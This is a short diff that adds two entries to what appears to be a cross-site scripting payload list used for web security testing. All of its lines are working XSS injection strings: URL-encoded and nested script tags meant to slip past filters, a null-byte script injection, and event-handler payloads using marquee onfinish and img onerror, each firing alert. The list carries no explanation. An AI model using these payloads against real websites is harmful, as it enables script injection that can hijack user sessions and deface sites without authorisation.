@@ -3,3 +3,5 @@
 "%3e%3cscript%3ealert(9)%3c/script%3e
 "<scr<script>ipt>alert(9)</scr</script>ipt>
 %00"><script>alert(9)</script>
+<marquee loop=1 width=0 onfinish=alert`1`>XSS</marquee>
+<img src=x onerror=alert(1)>
